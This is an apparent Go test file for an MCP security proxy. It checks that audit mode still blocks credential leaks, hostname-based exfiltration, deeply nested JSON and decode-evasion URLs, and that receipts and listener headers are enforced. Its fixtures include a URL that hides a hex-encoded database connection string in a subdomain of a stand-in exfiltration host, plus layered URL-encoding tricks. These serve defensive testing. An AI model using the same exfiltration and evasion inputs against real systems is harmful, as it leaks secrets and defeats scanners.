// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package mcp

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/luckyPipewrench/pipelock/internal/config"
	"github.com/luckyPipewrench/pipelock/internal/mcp/transport"
	"github.com/luckyPipewrench/pipelock/internal/normalize"
	"github.com/luckyPipewrench/pipelock/internal/scanner"
)

// TestAuditModeMCPInputFloors records input floors that stay refused when
// enforce is false. The MCP proxy does not read enforce.
func TestAuditModeMCPInputFloors(t *testing.T) {
	host := "https://706f7374677265733a2f2f757365723a70617373406462.exfil.vendor.example/leak"
	nested := "%68"
	for range normalize.ScannerQueryUnescapeMaxRounds + 1 {
		nested = strings.ReplaceAll(nested, "%", "%25")
	}
	query := make([]string, 112)
	for i := range query {
		query[i] = fmt.Sprintf("a%d=%d", i, i%10)
	}
	cases := []struct{ name, body string }{
		{"credential", `{"text":"` + fakeAWSKey() + `"}`},
		{"hostname_exfil", `{"url":"` + host + `"}`},
		{"deep_json", deepJSONObject("safe", 100)},
		{"url_decode_bound", `{"url":"https://api.vendor.example/?q=` + nested + `"}`},
		{"query_subsequence_bound", `{"url":"https://api.vendor.example/?` + strings.Join(query, "&") + `"}`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			msg := []byte(`{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"send","arguments":` + tc.body + `}}`)
			if strings.HasPrefix(tc.name, "url_") || strings.HasPrefix(tc.name, "query_") {
				uri := strings.TrimSuffix(strings.TrimPrefix(tc.body, `{"url":"`), `"}`)
				msg = []byte(makeRequest(1, "resources/read", map[string]string{"uri": uri}))
			}
			for _, enabled := range []bool{true, false} {
				cfg := config.Defaults()
				cfg.Internal = nil
				cfg.SSRF.IPAllowlist = []string{"127.0.0.0/8", "::1/128"}
				cfg.ResponseScanning.Action = config.ActionWarn
				off := false
				cfg.Enforce = &off
				sc := scanner.MustNew(cfg)
				t.Cleanup(sc.Close)
				opts := testOpts(sc)
				opts.InputCfg = &InputScanConfig{Enabled: enabled, Action: config.ActionWarn, OnParseError: config.ActionBlock}
				if got := scanHTTPInputDecision(msg, io.Discard, "session", "session", opts); got.Blocked == nil {
					t.Errorf("HTTP enabled=%v released the floor", enabled)
				}
				var out bytes.Buffer
				blocked := make(chan BlockedRequest, 2)
				ForwardScannedInput(transport.NewStdioReader(bytes.NewReader(append(append([]byte(nil), msg...), '\n'))), transport.NewStdioWriter(&out), io.Discard, config.ActionWarn, config.ActionBlock, blocked, nil, nil, opts)
				if out.Len() != 0 || len(blocked) == 0 {
					t.Errorf("stdio enabled=%v forwarded=%d blocked=%d", enabled, out.Len(), len(blocked))
				}
			}
		})
	}
}

func TestAuditModeMCPRequiredReceipt(t *testing.T) {
	opts := testOpts(testInputScanner(t))
	opts.RequireReceipts = true
	opts.Transport = transportMCPStdio
	opts.PolicyHash = mcpTestPolicyHash
	msg := []byte(makeRequest(1, "tools/call", map[string]any{"name": "send", "arguments": map[string]string{"text": "ordinary"}}))
	if got := scanHTTPInputDecision(msg, io.Discard, "session", "session", opts); got.Blocked == nil {
		t.Fatal("released without required receipt")
	}
	emitter, _, _, _ := newReceiptTestHarness(t)
	opts.ReceiptEmitter = emitter
	if got := scanHTTPInputDecision(msg, io.Discard, "session", "session", opts); got.Blocked != nil {
		t.Fatalf("refused healthy receipt: %+v", got.Blocked)
	}
}

func TestAuditModeMCPListenerProtocolAdmission(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		t.Error("invalid listener request reached upstream")
		w.WriteHeader(http.StatusOK)
	}))
	t.Cleanup(upstream.Close)
	opts := testOpts(testScannerForHTTP(t))
	base, _ := startListenerProxyWithOpts(t, upstream.URL, opts)
	for _, tc := range []struct {
		name, method, header, value string
		status                      int
	}{
		{"method", http.MethodPatch, "", "", http.StatusMethodNotAllowed},
		{"session", http.MethodPost, "Mcp-Session-Id", "invalid id", http.StatusBadRequest},
		{"token", http.MethodPost, listenerSessionTokenHeader, "invalid token", http.StatusBadRequest},
	} {
		t.Run(tc.name, func(t *testing.T) {
			req, err := http.NewRequestWithContext(t.Context(), tc.method, base, strings.NewReader(jsonToolsList))
			if err != nil {
				t.Fatal(err)
			}
			if tc.header != "" {
				req.Header.Set(tc.header, tc.value)
			}
			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				t.Fatal(err)
			}
			_ = resp.Body.Close()
			if resp.StatusCode != tc.status {
				t.Fatalf("status=%d want %d", resp.StatusCode, tc.status)
			}
		})
	}
}

func TestAuditModeMCPFragmentInspection(t *testing.T) {
	cfg := config.Defaults()
	cfg.Internal = nil
	cfg.SSRF.IPAllowlist = []string{"127.0.0.0/8", "::1/128"}
	off := false
	cfg.Enforce = &off
	sc := scanner.MustNew(cfg)
	t.Cleanup(sc.Close)
	opts := MCPProxyOpts{Scanner: sc, CEE: newCEERuntimeMatrixDeps(t)}
	opts.CEE.Reconfigure(config.CrossRequestDetection{Enabled: true, Action: config.ActionWarn, FragmentReassembly: config.CrossRequestFragments{Enabled: true, MaxBufferBytes: 4096, WindowMinutes: 5}}, nil)
	first := makeRequest(86, methodToolsCall, map[string]any{"name": "echo", "arguments": map[string]string{"payload": `{"n":1e`}})
	second := makeRequest(87, methodToolsCall, map[string]any{"name": "echo", "arguments": map[string]string{"payload": `10001}`}})
	if result := scanHTTPInputDecision([]byte(first), io.Discard, "limit-session", "audit", opts); result.Blocked != nil {
		t.Fatalf("seed refused: %+v", result.Blocked)
	}
	if result := scanHTTPInputDecision([]byte(second), io.Discard, "limit-session", "audit", opts); result.Blocked == nil {
		t.Fatal("fragment inspection limit released")
	}
}
